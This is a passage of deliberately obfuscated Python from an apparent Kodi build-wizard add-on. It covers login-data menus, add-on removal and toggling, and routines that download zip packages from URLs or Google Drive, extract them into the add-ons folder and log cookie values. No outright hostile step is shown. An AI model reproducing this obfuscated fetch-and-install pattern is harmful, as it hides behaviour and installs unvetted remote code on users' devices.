		OOOOO00OO00000000 .append ((THEME2 %'%s Settings'%OOOOOOOOO0O00O0O0 ,'RunPlugin(plugin://%s/?mode=opensettings&name=%s&url=login)'%(ADDON_ID ,OO00OOOOO00OO000O )))#line:3019
		addFile ('[+]-> %s'%OOOOOOOOO0O00O0O0 ,'',icon =OOOO0000O0OOOOO00 ,fanart =O000O0000000OOO00 ,themeit =THEME3 )#line:3021
		if not os .path .exists (O00OO00000O00OO0O ):addFile ('[COLOR red]Addon Data: Not Installed[/COLOR]','',icon =OOOO0000O0OOOOO00 ,fanart =O000O0000000OOO00 ,menu =OOOOO00OO00000000 )#line:3022
		elif not O0OO0000O0000OO0O :addFile ('[COLOR red]Addon Data: Not Registered[/COLOR]','authlogin',OO00OOOOO00OO000O ,icon =OOOO0000O0OOOOO00 ,fanart =O000O0000000OOO00 ,menu =OOOOO00OO00000000 )#line:3023
		else :addFile ('[COLOR green]Addon Data: %s[/COLOR]'%O0OO0000O0000OO0O ,'authlogin',OO00OOOOO00OO000O ,icon =OOOO0000O0OOOOO00 ,fanart =O000O0000000OOO00 ,menu =OOOOO00OO00000000 )#line:3024
		if O00O0OO0O0OOOOO00 =="":#line:3025
			if os .path .exists (O0OOOO0O00OOOOOO0 ):addFile ('[COLOR red]Saved Data: Save File Found(Import Data)[/COLOR]','importlogin',OO00OOOOO00OO000O ,icon =OOOO0000O0OOOOO00 ,fanart =O000O0000000OOO00 ,menu =OO0O0OOOO000OOOO0 )#line:3026
			else :addFile ('[COLOR red]Saved Data: Not Saved[/COLOR]','savelogin',OO00OOOOO00OO000O ,icon =OOOO0000O0OOOOO00 ,fanart =O000O0000000OOO00 ,menu =OO0O0OOOO000OOOO0 )#line:3027
		else :addFile ('[COLOR green]Saved Data: %s[/COLOR]'%O00O0OO0O0OOOOO00 ,'',icon =OOOO0000O0OOOOO00 ,fanart =O000O0000000OOO00 ,menu =OO0O0OOOO000OOOO0 )#line:3028
	if HIDESPACERS =='No':addFile (wiz .sep (),'',themeit =THEME3 )#line:3030
	addFile ('Save All Login Data','savelogin','all',icon =ICONLOGIN ,themeit =THEME3 )#line:3031
	addFile ('Recover All Saved Login Data','restorelogin','all',icon =ICONLOGIN ,themeit =THEME3 )#line:3032
	addFile ('Import Login Data','importlogin','all',icon =ICONLOGIN ,themeit =THEME3 )#line:3033
	addFile ('Clear All Saved Login Data','clearlogin','all',icon =ICONLOGIN ,themeit =THEME3 )#line:3034
	addFile ('Clear All Addon Data','addonlogin','all',icon =ICONLOGIN ,themeit =THEME3 )#line:3035
	setView ('files','viewType')#line:3036
def fixUpdate ():#line:3038
	if KODIV <17 :#line:3039
		OOOO0O0O0000O0OO0 =os .path .join (DATABASE ,wiz .latestDB ('Addons'))#line:3040
		try :#line:3041
			os .remove (OOOO0O0O0000O0OO0 )#line:3042
		except Exception as OOO0OO0O000O00000 :#line:3043
			wiz .log ("Unable to remove %s, Purging DB"%OOOO0O0O0000O0OO0 )#line:3044
			wiz .purgeDb (OOOO0O0O0000O0OO0 )#line:3045
	else :#line:3046
		xbmc .log ("Requested Addons.db be removed but doesnt work in Kod17")#line:3047
def removeAddonMenu ():#line:3049
	O0O000OOOO000OOO0 =glob .glob (os .path .join (ADDONS ,'*/'))#line:3050
	O0000O00000OO000O =[];O0O0000OO0O0O0000 =[]#line:3051
	for O0OOOO000O0O0OO00 in sorted (O0O000OOOO000OOO0 ,key =lambda O0O0O000OO0O000O0 :O0O0O000OO0O000O0 ):#line:3052
		OO00O0OO0OO0000O0 =os .path .split (O0OOOO000O0O0OO00 [:-1 ])[1 ]#line:3053
		if OO00O0OO0OO0000O0 in EXCLUDES :continue #line:3054
		elif OO00O0OO0OO0000O0 in DEFAULTPLUGINS :continue #line:3055
		elif OO00O0OO0OO0000O0 =='packages':continue #line:3056
		OOOOOO0O000OO00OO =os .path .join (O0OOOO000O0O0OO00 ,'addon.xml')#line:3057
		if os .path .exists (OOOOOO0O000OO00OO ):#line:3058
			OOO0O0O00O00O0OO0 =open (OOOOOO0O000OO00OO )#line:3059
			O0OOO0000OOOO0000 =OOO0O0O00O00O0OO0 .read ()#line:3060
			O000O00000000000O =wiz .parseDOM (O0OOO0000OOOO0000 ,'addon',ret ='id')#line:3061
			OOOOOOOOO0OO0000O =OO00O0OO0OO0000O0 if len (O000O00000000000O )==0 else O000O00000000000O [0 ]#line:3063
			try :#line:3064
				OOOOO00O00OOOO00O =xbmcaddon .Addon (id =OOOOOOOOO0OO0000O )#line:3065
				O0000O00000OO000O .append (OOOOO00O00OOOO00O .getAddonInfo ('name'))#line:3066
				O0O0000OO0O0O0000 .append (OOOOOOOOO0OO0000O )#line:3067
			except :#line:3068
				pass #line:3069
	if len (O0000O00000OO000O )==0 :#line:3070
		wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),"[COLOR %s]No Addons To Remove[/COLOR]"%COLOR2 )#line:3071
		return #line:3072
	if KODIV >16 :#line:3073
		OO000O0OO0000O000 =DIALOG .multiselect ("%s: Select the addons you wish to remove."%ADDONTITLE ,O0000O00000OO000O )#line:3074
	else :#line:3075
		OO000O0OO0000O000 =[];OO0O0OOO0O000000O =0 #line:3076
		OOOO000O0OO000O0O =["-- Click here to Continue --"]+O0000O00000OO000O #line:3077
		while not OO0O0OOO0O000000O ==-1 :#line:3078
			OO0O0OOO0O000000O =DIALOG .select ("%s: Select the addons you wish to remove."%ADDONTITLE ,OOOO000O0OO000O0O )#line:3079
			if OO0O0OOO0O000000O ==-1 :break #line:3080
			elif OO0O0OOO0O000000O ==0 :break #line:3081
			else :#line:3082
				O0OO0O0OOOO000OOO =(OO0O0OOO0O000000O -1 )#line:3083
				if O0OO0O0OOOO000OOO in OO000O0OO0000O000 :#line:3084
					OO000O0OO0000O000 .remove (O0OO0O0OOOO000OOO )#line:3085
					OOOO000O0OO000O0O [OO0O0OOO0O000000O ]=O0000O00000OO000O [O0OO0O0OOOO000OOO ]#line:3086
				else :#line:3087
					OO000O0OO0000O000 .append (O0OO0O0OOOO000OOO )#line:3088
					OOOO000O0OO000O0O [OO0O0OOO0O000000O ]="[B][COLOR %s]%s[/COLOR][/B]"%(COLOR1 ,O0000O00000OO000O [O0OO0O0OOOO000OOO ])#line:3089
	if OO000O0OO0000O000 ==None :return #line:3090
	if len (OO000O0OO0000O000 )>0 :#line:3091
		wiz .addonUpdates ('set')#line:3092
		for O000000O0OO0OOOOO in OO000O0OO0000O000 :#line:3093
			removeAddon (O0O0000OO0O0O0000 [O000000O0OO0OOOOO ],O0000O00000OO000O [O000000O0OO0OOOOO ],True )#line:3094
		xbmc .sleep (1000 )#line:3096
		if INSTALLMETHOD ==1 :OO0000OO0OO00O0O0 =1 #line:3098
		elif INSTALLMETHOD ==2 :OO0000OO0OO00O0O0 =0 #line:3099
		else :OO0000OO0OO00O0O0 =DIALOG .yesno (ADDONTITLE ,"[COLOR %s]סיום התקנה [COLOR %s]סגירה[/COLOR] או [COLOR %s]הצג נתונים[/COLOR]?[/COLOR]"%(COLOR2 ,COLOR1 ,COLOR1 ),yeslabel ="[B][COLOR green]הצג נתונים[/COLOR][/B]",nolabel ="[B][COLOR red]סגירה[/COLOR][/B]")#line:3100
		if OO0000OO0OO00O0O0 ==1 :wiz .reloadFix ('remove addon')#line:3101
		else :wiz .addonUpdates ('reset');wiz .killxbmc (True )#line:3102
def removeAddonDataMenu ():#line:3104
	if os .path .exists (ADDOND ):#line:3105
		addFile ('[COLOR red][B][REMOVE][/B][/COLOR] All Addon_Data','removedata','all',themeit =THEME2 )#line:3106
		addFile ('[COLOR red][B][REMOVE][/B][/COLOR] All Addon_Data for Uninstalled Addons','removedata','uninstalled',themeit =THEME2 )#line:3107
		addFile ('[COLOR red][B][REMOVE][/B][/COLOR] All Empty Folders in Addon_Data','removedata','empty',themeit =THEME2 )#line:3108
		addFile ('[COLOR red][B][REMOVE][/B][/COLOR] %s Addon_Data'%ADDONTITLE ,'resetaddon',themeit =THEME2 )#line:3109
		if HIDESPACERS =='No':addFile (wiz .sep (),'',themeit =THEME3 )#line:3110
		OOO0OOO0OO0O0O00O =glob .glob (os .path .join (ADDOND ,'*/'))#line:3111
		for OOOOOO00OOO0OOO00 in sorted (OOO0OOO0OO0O0O00O ,key =lambda OOOO00OOOOOO0OOO0 :OOOO00OOOOOO0OOO0 ):#line:3112
			O0OO0OOOOOO0OO0O0 =OOOOOO00OOO0OOO00 .replace (ADDOND ,'').replace ('\\','').replace ('/','')#line:3113
			O00000O0OO0OOO00O =os .path .join (OOOOOO00OOO0OOO00 .replace (ADDOND ,ADDONS ),'icon.png')#line:3114
			OOOO0OO00OOO00000 =os .path .join (OOOOOO00OOO0OOO00 .replace (ADDOND ,ADDONS ),'fanart.png')#line:3115
			O0O00OO0OO00OO0OO =O0OO0OOOOOO0OO0O0 #line:3116
			O00000000O0O000OO ={'audio.':'[COLOR orange][AUDIO] [/COLOR]','metadata.':'[COLOR cyan][METADATA] [/COLOR]','module.':'[COLOR orange][MODULE] [/COLOR]','plugin.':'[COLOR blue][PLUGIN] [/COLOR]','program.':'[COLOR orange][PROGRAM] [/COLOR]','repository.':'[COLOR gold][REPO] [/COLOR]','script.':'[COLOR green][SCRIPT] [/COLOR]','service.':'[COLOR green][SERVICE] [/COLOR]','skin.':'[COLOR dodgerblue][SKIN] [/COLOR]','video.':'[COLOR orange][VIDEO] [/COLOR]','weather.':'[COLOR yellow][WEATHER] [/COLOR]'}#line:3117
			for OOOOOO0000OOO00OO in O00000000O0O000OO :#line:3118
				O0O00OO0OO00OO0OO =O0O00OO0OO00OO0OO .replace (OOOOOO0000OOO00OO ,O00000000O0O000OO [OOOOOO0000OOO00OO ])#line:3119
			if O0OO0OOOOOO0OO0O0 in EXCLUDES :O0O00OO0OO00OO0OO ='[COLOR green][B][PROTECTED][/B][/COLOR] %s'%O0O00OO0OO00OO0OO #line:3120
			else :O0O00OO0OO00OO0OO ='[COLOR red][B][REMOVE][/B][/COLOR] %s'%O0O00OO0OO00OO0OO #line:3121
			addFile (' %s'%O0O00OO0OO00OO0OO ,'removedata',O0OO0OOOOOO0OO0O0 ,icon =O00000O0OO0OOO00O ,fanart =OOOO0OO00OOO00000 ,themeit =THEME2 )#line:3122
	else :#line:3123
		addFile ('No Addon data folder found.','',themeit =THEME3 )#line:3124
	setView ('files','viewType')#line:3125
def enableAddons ():#line:3127
	addFile ("[I][B][COLOR red]!!Notice: Disabling Some Addons Can Cause Issues!![/COLOR][/B][/I]",'',icon =ICONMAINT )#line:3128
	O0O0OOOO0OO00OO0O =glob .glob (os .path .join (ADDONS ,'*/'))#line:3129
	O0O00OO00OOO0OOO0 =0 #line:3130
	for OO0000000OOOOOOO0 in sorted (O0O0OOOO0OO00OO0O ,key =lambda O00OOOOOOOO000O0O :O00OOOOOOOO000O0O ):#line:3131
		O00O0O00O0OOOO000 =os .path .split (OO0000000OOOOOOO0 [:-1 ])[1 ]#line:3132
		if O00O0O00O0OOOO000 in EXCLUDES :continue #line:3133
		if O00O0O00O0OOOO000 in DEFAULTPLUGINS :continue #line:3134
		OO000O00O0O000OOO =os .path .join (OO0000000OOOOOOO0 ,'addon.xml')#line:3135
		if os .path .exists (OO000O00O0O000OOO ):#line:3136
			O0O00OO00OOO0OOO0 +=1 #line:3137
			O0O0OOOO0OO00OO0O =OO0000000OOOOOOO0 .replace (ADDONS ,'')[1 :-1 ]#line:3138
			OO0O00OO0OOO00OOO =open (OO000O00O0O000OOO )#line:3139
			O0O0OO0OO0OO0OO0O =OO0O00OO0OOO00OOO .read ().replace ('\n','').replace ('\r','').replace ('\t','')#line:3140
			OOOO0O0O0OO000000 =wiz .parseDOM (O0O0OO0OO0OO0OO0O ,'addon',ret ='id')#line:3141
			O00O0OO00O0O00OOO =wiz .parseDOM (O0O0OO0OO0OO0OO0O ,'addon',ret ='name')#line:3142
			try :#line:3143
				OOO0000OOOO00O000 =OOOO0O0O0OO000000 [0 ]#line:3144
				OOO0O0O00000OOOO0 =O00O0OO00O0O00OOO [0 ]#line:3145
			except :#line:3146
				continue #line:3147
			try :#line:3148
				O0OOOO0000O000OOO =xbmcaddon .Addon (id =OOO0000OOOO00O000 )#line:3149
				O00OOOO0O00OOO0OO ="[COLOR green][Enabled][/COLOR]"#line:3150
				O000OO0O0O000O00O ="false"#line:3151
			except :#line:3152
				O00OOOO0O00OOO0OO ="[COLOR red][Disabled][/COLOR]"#line:3153
				O000OO0O0O000O00O ="true"#line:3154
				pass #line:3155
			OOOOO00O0OO00OO00 =os .path .join (OO0000000OOOOOOO0 ,'icon.png')if os .path .exists (os .path .join (OO0000000OOOOOOO0 ,'icon.png'))else ICON #line:3156
			O0OO0000O00O00OOO =os .path .join (OO0000000OOOOOOO0 ,'fanart.jpg')if os .path .exists (os .path .join (OO0000000OOOOOOO0 ,'fanart.jpg'))else FANART #line:3157
			addFile ("%s %s"%(O00OOOO0O00OOO0OO ,OOO0O0O00000OOOO0 ),'toggleaddon',O0O0OOOO0OO00OO0O ,O000OO0O0O000O00O ,icon =OOOOO00O0OO00OO00 ,fanart =O0OO0000O00O00OOO )#line:3158
			OO0O00OO0OOO00OOO .close ()#line:3159
	if O0O00OO00OOO0OOO0 ==0 :#line:3160
		addFile ("No Addons Found to Enable or Disable.",'',icon =ICONMAINT )#line:3161
	setView ('files','viewType')#line:3162
def changeFeq ():#line:3164
	OO0O00000O0OOO0O0 =['Every Startup','Every Day','Every Three Days','Every Weekly']#line:3165
	O0000OO00OO00OOOO =DIALOG .select ("[COLOR %s]How often would you list to Auto Clean on Startup?[/COLOR]"%COLOR2 ,OO0O00000O0OOO0O0 )#line:3166
	if not O0000OO00OO00OOOO ==-1 :#line:3167
		wiz .setS ('autocleanfeq',str (O0000OO00OO00OOOO ))#line:3168
		wiz .LogNotify ('[COLOR %s]Auto Clean Up[/COLOR]'%COLOR1 ,'[COLOR %s]Fequency Now %s[/COLOR]'%(COLOR2 ,OO0O00000O0OOO0O0 [O0000OO00OO00OOOO ]))#line:3169
def developer ():#line:3171
	addFile ('Convert Text Files to 0.1.7','converttext',themeit =THEME1 )#line:3172
	addFile ('Create QR Code','createqr',themeit =THEME1 )#line:3173
	addFile ('Test Notifications','testnotify',themeit =THEME1 )#line:3174
	addFile ('Test Update','testupdate',themeit =THEME1 )#line:3175
	addFile ('Test First Run','testfirst',themeit =THEME1 )#line:3176
	addFile ('Test First Run Settings','testfirstrun',themeit =THEME1 )#line:3177
	addFile ('Test APk','testapk',themeit =THEME1 )#line:3178
	setView ('files','viewType')#line:3180
def download (OO0O0O000OOO00OO0 ,O0O00O000O0O00O0O ):#line:3185
  O000OO000O0O000O0 =xbmc .translatePath (os .path .join ('special://home/addons','packages'))#line:3186
  OO00OOO00O00OOOOO =xbmcgui .DialogProgress ()#line:3187
  OO00OOO00O00OOOOO .create ("XBMC ISRAEL","Downloading "+name ,'','Please Wait')#line:3188
  OO0OO0O00O0O0000O =os .path .join (O000OO000O0O000O0 ,'isr.zip')#line:3189
  O0000OO0000O0O0O0 =urllib2 .Request (OO0O0O000OOO00OO0 )#line:3190
  OO0O00OO0OO000O0O =urllib2 .urlopen (O0000OO0000O0O0O0 )#line:3191
  OOO00O0OO0OOOOO00 =xbmcgui .DialogProgress ()#line:3193
  OOO00O0OO0OOOOO00 .create ("Downloading","Downloading "+name )#line:3194
  OOO00O0OO0OOOOO00 .update (0 )#line:3195
  OOOOOOO00OO0000OO =O0O00O000O0O00O0O #line:3196
  OO0OOOOO0OOOOO0OO =open (OO0OO0O00O0O0000O ,'wb')#line:3197
  try :#line:3199
    O0OO0OOO00OO00O00 =OO0O00OO0OO000O0O .info ().getheader ('Content-Length').strip ()#line:3200
    OOOO000OO00O000O0 =True #line:3201
  except AttributeError :#line:3202
        OOOO000OO00O000O0 =False #line:3203
  if OOOO000OO00O000O0 :#line:3205
        O0OO0OOO00OO00O00 =int (O0OO0OOO00OO00O00 )#line:3206
  OOO0OO0OO0O0O0O0O =0 #line:3208
  OOOO0OO0O00OO0000 =time .time ()#line:3209
  while True :#line:3210
        OOO0OO0000OOOOOO0 =OO0O00OO0OO000O0O .read (8192 )#line:3211
        if not OOO0OO0000OOOOOO0 :#line:3212
            sys .stdout .write ('\n')#line:3213
            break #line:3214
        OOO0OO0OO0O0O0O0O +=len (OOO0OO0000OOOOOO0 )#line:3216
        OO0OOOOO0OOOOO0OO .write (OOO0OO0000OOOOOO0 )#line:3217
        if not OOOO000OO00O000O0 :#line:3219
            O0OO0OOO00OO00O00 =OOO0OO0OO0O0O0O0O #line:3220
        if OOO00O0OO0OOOOO00 .iscanceled ():#line:3221
           OOO00O0OO0OOOOO00 .close ()#line:3222
           try :#line:3223
            os .remove (OO0OO0O00O0O0000O )#line:3224
           except :#line:3225
            pass #line:3226
           break #line:3227
        O00000O00OO00O0OO =float (OOO0OO0OO0O0O0O0O )/O0OO0OOO00OO00O00 #line:3228
        O00000O00OO00O0OO =round (O00000O00OO00O0OO *100 ,2 )#line:3229
        OOOO0OO0000O00O00 =OOO0OO0OO0O0O0O0O /(1024 *1024 )#line:3230
        O000O0O00OOOO0000 =O0OO0OOO00OO00O00 /(1024 *1024 )#line:3231
        O0O0OOO0OO00O00O0 ='[COLOR %s][B]Size:[/B] [COLOR %s]%.02f[/COLOR] MB of [COLOR %s]%.02f[/COLOR] MB[/COLOR]'%('teal','skyblue',OOOO0OO0000O00O00 ,'teal',O000O0O00OOOO0000 )#line:3232
        if (time .time ()-OOOO0OO0O00OO0000 )>0 :#line:3233
          OOO0O00000O0O0OO0 =OOO0OO0OO0O0O0O0O /(time .time ()-OOOO0OO0O00OO0000 )#line:3234
          OOO0O00000O0O0OO0 =OOO0O00000O0O0OO0 /1024 #line:3235
        else :#line:3236
         OOO0O00000O0O0OO0 =0 #line:3237
        O0O00OOOO000OOO0O ='KB'#line:3238
        if OOO0O00000O0O0OO0 >=1024 :#line:3239
           OOO0O00000O0O0OO0 =OOO0O00000O0O0OO0 /1024 #line:3240
           O0O00OOOO000OOO0O ='MB'#line:3241
        if OOO0O00000O0O0OO0 >0 and not O00000O00OO00O0OO ==100 :#line:3242
            OO0000OOO00OO0OO0 =(O0OO0OOO00OO00O00 -OOO0OO0OO0O0O0O0O )/OOO0O00000O0O0OO0 #line:3243
        else :#line:3244
            OO0000OOO00OO0OO0 =0 #line:3245
        OOOO00000OOOO0OO0 ='[COLOR %s][B]Speed:[/B] [COLOR %s]%.02f [/COLOR]%s/s '%('teal','skyblue',OOO0O00000O0O0OO0 ,O0O00OOOO000OOO0O )#line:3246
        OOO00O0OO0OOOOO00 .update (int (O00000O00OO00O0OO ),"Downloading "+name ,O0O0OOO0OO00O00O0 ,OOOO00000OOOO0OO0 )#line:3248
  OO0O0OOO00O0O00OO =xbmc .translatePath (os .path .join ('special://home','addons'))#line:3251
  OO0OOOOO0OOOOO0OO .close ()#line:3253
  extract (OO0OO0O00O0O0000O ,OO0O0OOO00O0O00OO ,OOO00O0OO0OOOOO00 )#line:3255
  if os .path .exists (OO0O0OOO00O0O00OO +'/scakemyer-script.quasar.burst'):#line:3256
    if os .path .exists (OO0O0OOO00O0O00OO +'/script.quasar.burst'):#line:3257
     shutil .rmtree (OO0O0OOO00O0O00OO +'/script.quasar.burst',ignore_errors =False )#line:3258
    os .rename (OO0O0OOO00O0O00OO +'/scakemyer-script.quasar.burst',OO0O0OOO00O0O00OO +'/script.quasar.burst')#line:3259
  if os .path .exists (OO0O0OOO00O0O00OO +'/plugin.video.kmediatorrent-master'):#line:3261
    if os .path .exists (OO0O0OOO00O0O00OO +'/plugin.video.kmediatorrent'):#line:3262
     shutil .rmtree (OO0O0OOO00O0O00OO +'/plugin.video.kmediatorrent',ignore_errors =False )#line:3263
    os .rename (OO0O0OOO00O0O00OO +'/plugin.video.kmediatorrent-master',OO0O0OOO00O0O00OO +'/plugin.video.kmediatorrent')#line:3264
  xbmc .executebuiltin ('UpdateLocalAddons ')#line:3265
  xbmc .executebuiltin ("UpdateAddonRepos")#line:3266
  try :#line:3267
    os .remove (OO0OO0O00O0O0000O )#line:3268
  except :#line:3269
    pass #line:3270
  OOO00O0OO0OOOOO00 .close ()#line:3271
def dis_or_enable_addon (OOO00OO00OOO0OOO0 ,OO00OO0O0OO0O0O00 ,enable ="true"):#line:3272
    import json #line:3273
    O00000OO0O000O00O ='"%s"'%OOO00OO00OOO0OOO0 #line:3274
    if xbmc .getCondVisibility ("System.HasAddon(%s)"%OOO00OO00OOO0OOO0 )and enable =="true":#line:3275
        logging .warning ('already Enabled')#line:3276
        return xbmc .log ("### Skipped %s, reason = allready enabled"%OOO00OO00OOO0OOO0 )#line:3277
    elif not xbmc .getCondVisibility ("System.HasAddon(%s)"%OOO00OO00OOO0OOO0 )and enable =="false":#line:3278
        return xbmc .log ("### Skipped %s, reason = not installed"%OOO00OO00OOO0OOO0 )#line:3279
    else :#line:3280
        OO0OO0000000OOO00 ='{"jsonrpc":"2.0","id":1,"method":"Addons.SetAddonEnabled","params":{"addonid":%s,"enabled":%s}}'%(O00000OO0O000O00O ,enable )#line:3281
        O000O000O0O0O00O0 =xbmc .executeJSONRPC (OO0OO0000000OOO00 )#line:3282
        OO0O00000O00OO0OO =json .loads (O000O000O0O0O00O0 )#line:3283
        if enable =="true":#line:3284
            xbmc .log ("### Enabled %s, response = %s"%(OOO00OO00OOO0OOO0 ,OO0O00000O00OO0OO ))#line:3285
        else :#line:3286
            xbmc .log ("### Disabled %s, response = %s"%(OOO00OO00OOO0OOO0 ,OO0O00000O00OO0OO ))#line:3287
    if OO00OO0O0OO0O0O00 =='auto':#line:3288
     return True #line:3289
    return xbmc .executebuiltin ('Container.Update(%s)'%xbmc .getInfoLabel ('Container.FolderPath'))#line:3290
def chunk_report (O0OOO0O0OO0OO00OO ,O00O00OO0OOO0O0OO ,O00000OOO0OO0OOO0 ):#line:3291
   OOOO0000O00O0O0O0 =float (O0OOO0O0OO0OO00OO )/O00000OOO0OO0OOO0 #line:3292
   OOOO0000O00O0O0O0 =round (OOOO0000O00O0O0O0 *100 ,2 )#line:3293
   if O0OOO0O0OO0OO00OO >=O00000OOO0OO0OOO0 :#line:3295
      sys .stdout .write ('\n')#line:3296
def chunk_read (OO0O0OOOO0O00OO0O ,chunk_size =8192 ,report_hook =None ,dp =None ,destination ='',filesize =1000000 ):#line:3298
   import time #line:3299
   O00O0000OOO00OOO0 =int (filesize )*1000000 #line:3300
   O0000000O0000O0OO =0 #line:3302
   OOO00O000OO0000O0 =time .time ()#line:3303
   O0O0O000OO000OOO0 =0 #line:3304
   logging .warning ('Downloading')#line:3306
   with open (destination ,"wb")as O000OOOO0000OO0O0 :#line:3307
    while 1 :#line:3308
      O0OOOO0O0O0O00OOO =time .time ()-OOO00O000OO0000O0 #line:3309
      OO000O0000OO0OOO0 =int (O0O0O000OO000OOO0 *chunk_size )#line:3310
      OO0O0000OOOO00OOO =OO0O0OOOO0O00OO0O .read (chunk_size )#line:3311
      O000OOOO0000OO0O0 .write (OO0O0000OOOO00OOO )#line:3312
      O000OOOO0000OO0O0 .flush ()#line:3313
      O0000000O0000O0OO +=len (OO0O0000OOOO00OOO )#line:3314
      O0O0OO00000OOOO0O =float (O0000000O0000O0OO )/O00O0000OOO00OOO0 #line:3315
      O0O0OO00000OOOO0O =round (O0O0OO00000OOOO0O *100 ,2 )#line:3316
      if int (O0OOOO0O0O0O00OOO )>0 :#line:3317
        O0OOO0O000O000O00 =int (OO000O0000OO0OOO0 /(1024 *O0OOOO0O0O0O00OOO ))#line:3318
      else :#line:3319
         O0OOO0O000O000O00 =0 #line:3320
      if O0OOO0O000O000O00 >1024 and not O0O0OO00000OOOO0O ==100 :#line:3321
          OOO00O0O000OO0000 =int (((O00O0000OOO00OOO0 -OO000O0000OO0OOO0 )/1024 )/(O0OOO0O000O000O00 ))#line:3322
      else :#line:3323
          OOO00O0O000OO0000 =0 #line:3324
      if OOO00O0O000OO0000 <0 :#line:3325
        OOO00O0O000OO0000 =0 #line:3326
      dp .update (int (O0O0OO00000OOOO0O ),name ,"\r%d%%,[COLOR aqua] %d MB / %d MB [/COLOR], %d KB/s "%(O0O0OO00000OOOO0O ,OO000O0000OO0OOO0 /(1024 *1024 ),O00O0000OOO00OOO0 /(1000 *1000 ),O0OOO0O000O000O00 ),'[B]ETA:[/B] [COLOR aqua]%02d:%02d[/COLOR]'%divmod (OOO00O0O000OO0000 ,60 ))#line:3327
      if dp .iscanceled ():#line:3328
         dp .close ()#line:3329
         break #line:3330
      if not OO0O0000OOOO00OOO :#line:3331
         break #line:3332
      if report_hook :#line:3334
         report_hook (O0000000O0000O0OO ,chunk_size ,O00O0000OOO00OOO0 )#line:3335
      O0O0O000OO000OOO0 +=1 #line:3336
   logging .warning ('END Downloading')#line:3337
   return O0000000O0000O0OO #line:3338
def googledrive_download (O0OOO00O0OO0000O0 ,O0000OO000000O0OO ,OOOOO0OO0OOO00000 ,O0OOO00OO00O000OO ):#line:3340
    OO00000O0OO0000OO =[]#line:3344
    O00OO0O0OO000O000 =O0OOO00O0OO0000O0 .split ('=')#line:3345
    O0OOO00O0OO0000O0 =O00OO0O0OO000O000 [len (O00OO0O0OO000O000 )-1 ]#line:3346
    def O0OOO0OOOOOO0O0OO (O0O000O00O0OO0O00 ):#line:3348
        for O0OO000000O000000 in O0O000O00O0OO0O00 :#line:3350
            logging .warning ('cookie.name')#line:3351
            logging .warning (O0OO000000O000000 .name )#line:3352
            OO0O00OO000OOOOO0 =O0OO000000O000000 .value #line:3353
            if 'download_warning'in O0OO000000O000000 .name :#line:3354
                logging .warning (O0OO000000O000000 .value )#line:3355
                logging .warning ('cookie.value')#line:3356
                return O0OO000000O000000 .value #line:3357
            return OO0O00OO000OOOOO0 #line:3358
        return None #line:3360
    def O00OO000O00OOO0O0 (O0000OO00OO000OO0 ,OO0O0OO0OO0O0OO0O ):#line:3362
        O0OOO0000O00O00O0 =32768 #line:3364
        O0O0O000OO00OO0O0 =time .time ()#line:3365
        with open (OO0O0OO0OO0O0OO0O ,"wb")as O0OO0OOO0O0000O0O :#line:3367
            O0O000OO0O0O0OO0O =1 #line:3368
            OO000000OOO00O00O =32768 #line:3369
            try :#line:3370
                OOO0OOOOO000O0O0O =int (O0000OO00OO000OO0 .headers .get ('content-length'))#line:3371
                print ('file total size :',OOO0OOOOO000O0O0O )#line:3372
            except TypeError :#line:3373
                print ('using dummy length !!!')#line:3374
                OOO0OOOOO000O0O0O =int (O0OOO00OO00O000OO )*1000000 #line:3375
            for OOO00OOO0OOO0000O in O0000OO00OO000OO0 .iter_content (O0OOO0000O00O00O0 ):#line:3376
                if OOO00OOO0OOO0000O :#line:3377
                    O0OO0OOO0O0000O0O .write (OOO00OOO0OOO0000O )#line:3378
                    O0OO0OOO0O0000O0O .flush ()#line:3379
                    OOO00OO0000OOOO00 =time .time ()-O0O0O000OO00OO0O0 #line:3380
                    O0O00OOO00OO0O0O0 =int (O0O000OO0O0O0OO0O *OO000000OOO00O00O )#line:3381
                    if OOO00OO0000OOOO00 ==0 :#line:3382
                        OOO00OO0000OOOO00 =0.1 #line:3383
                    O00000000OOO0000O =int (O0O00OOO00OO0O0O0 /(1024 *OOO00OO0000OOOO00 ))#line:3384
                    O0O0OO00OO0OOO00O =int (O0O000OO0O0O0OO0O *OO000000OOO00O00O *100 /OOO0OOOOO000O0O0O )#line:3385
                    if O00000000OOO0000O >1024 and not O0O0OO00OO0OOO00O ==100 :#line:3386
                      OOOOO0O0O00OO0000 =int (((OOO0OOOOO000O0O0O -O0O00OOO00OO0O0O0 )/1024 )/(O00000000OOO0000O ))#line:3387
                    else :#line:3388
                      OOOOO0O0O00OO0000 =0 #line:3389
                    OOOOO0OO0OOO00000 .update (int (O0O0OO00OO0OOO00O ),name ,"\r%d%%,[COLOR aqua] %d MB / %d MB [/COLOR], %d KB/s "%(O0O0OO00OO0OOO00O ,O0O00OOO00OO0O0O0 /(1024 *1024 ),OOO0OOOOO000O0O0O /(1000 *1000 ),O00000000OOO0000O ),'[B]ETA:[/B] [COLOR aqua]%02d:%02d[/COLOR]'%divmod (OOOOO0O0O00OO0000 ,60 ))#line:3391
                    O0O000OO0O0O0OO0O +=1 #line:3392
                    if OOOOO0OO0OOO00000 .iscanceled ():#line:3393
                     OOOOO0OO0OOO00000 .close ()#line:3394
                     break #line:3395
    OO000O00O0O0O0O00 ="https://docs.google.com/uc?export=download"#line:3396
    import urllib2 #line:3401
    import cookielib #line:3402
    from cookielib import CookieJar #line:3404
    O0OOOOO0O00O0O0OO =CookieJar ()#line:3406
    O00OO00O00OO0OOOO =urllib2 .build_opener (urllib2 .HTTPCookieProcessor (O0OOOOO0O00O0O0OO ))#line:3407
    O000O00O0O0O0O000 ={'id':O0OOO00O0OO0000O0 }#line:3409
    O0000000OO000O0O0 =urllib .urlencode (O000O00O0O0O0O000 )#line:3410
    logging .warning (OO000O00O0O0O0O00 +'&'+O0000000OO000O0O0 )#line:3411
    OOO0O0OOO0O00OO00 =O00OO00O00OO0OOOO .open (OO000O00O0O0O0O00 +'&'+O0000000OO000O0O0 )#line:3412
    OO00O000O000OOOOO =OOO0O0OOO0O00OO00 .read ()#line:3413
    for OO0OO00O000000O00 in O0OOOOO0O00O0O0OO :#line:3415
         logging .warning (OO0OO00O000000O00 )#line:3416
    O0O0OO0O0O0O0O0OO =O0OOO0OOOOOO0O0OO (O0OOOOO0O00O0O0OO )#line:3417
    logging .warning (O0O0OO0O0O0O0O0OO )#line:3418
    if O0O0OO0O0O0O0O0OO :#line:3419
        OOO0OOOOO000O00OO ={'id':O0OOO00O0OO0000O0 ,'confirm':O0O0OO0O0O0O0O0OO }#line:3420
